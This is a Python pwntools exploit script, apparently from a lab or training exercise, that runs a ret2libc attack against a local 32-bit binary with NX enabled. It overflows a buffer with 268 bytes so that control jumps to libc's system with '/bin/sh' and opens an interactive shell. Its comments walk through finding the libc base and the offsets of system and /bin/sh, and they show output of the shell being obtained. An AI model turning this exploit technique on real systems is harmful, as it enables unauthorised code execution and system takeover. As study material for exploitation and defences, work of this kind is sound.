#!/usr/bin/env python

# We can assembly the shell location now via base + offset .
# Find libc base:
# ldd vuln_with_nx # libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7df7000) # <- this is it
# Find /bin/sh offset:
# It yields: 0xf7df7000 + 15fa0f = 0xf7f56a0f
# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "bin/sh" #  15fa0f /bin/sh # <- this is our offset
# Find system:
# This yields: 0xf7df7000 + 0x3b060 = 0xf7e32060
# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system" # 1461: 0003b060    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0 # this is our gem

# python bypass_ret2libc.py INFO
# [*] '/DEP/binary/vuln_with_nx'
#     Arch:     i386-32-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x8048000)
# [*] '/lib/i386-linux-gnu/libc-2.24.so'
#     Arch:     i386-32-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Shell located at offset from libc: 0x15fa0f
# [+] Shell is at address: 0xf7f56a0f
# [+] libc.system() has a 0x3b060 offset from libc
# [+] system call is at address: 0xf7e32060
# [+] Starting local process './binary/vuln_with_nx': pid 65828
# [*] Switching to interactive mode
# Hello, I'm your friendly & totally secure binary :)!
# What is your name?
# Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` ��JUNK\x0fj��!
# $ whoami
# pwnbox
# $

import argparse
import sys
from pwn import *
from pwnlib import *

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./vuln_with_nx')
libc = ELF('/lib/i386-linux-gnu/libc-2.24.so')


def main():
    parser = argparse.ArgumentParser(description='pwnage')
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

    executable = './vuln_with_nx'

    libc_base = 0xf7df7000

    binsh = int(libc.search("/bin/sh").next())
    print("[+] Shell located at offset from libc: %s" % hex(binsh))
    shell_addr = libc_base + binsh
    print("[+] Shell is at address: %s" % hex(shell_addr))
    print("[+] libc.system() has a %s offset from libc" % hex(libc.symbols["system"]))
    system_call = int(libc_base + libc.symbols["system"])
    print("[+] system call is at address: %s" % hex(system_call))

    payload = 'A' * 268
    payload += p32(system_call)
    payload += 'JUNK'
    payload += p32(shell_addr)

    if args.dbg:
        r = gdb.debug([executable, payload],
                        gdbscript="""
                        b *totally_secure+53
                        continue""")
    else:
        r = process([executable, payload])
    r.interactive()

if __name__ == '__main__':
    main()
    sys.exit(0)